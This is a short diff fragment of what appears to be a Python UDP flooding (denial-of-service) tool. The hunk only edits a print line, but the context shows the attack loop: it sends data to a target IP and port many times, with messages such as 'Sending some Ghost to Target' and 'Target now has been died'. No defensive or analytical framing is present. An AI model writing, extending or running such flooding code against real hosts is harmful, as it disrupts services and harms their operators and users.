@@ -19,7 +19,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sending some Ghost to Target")
+			print("Sending some Ghost to Target")
 		except:
 			print("[!] Target now has been died please check that ip.")
 
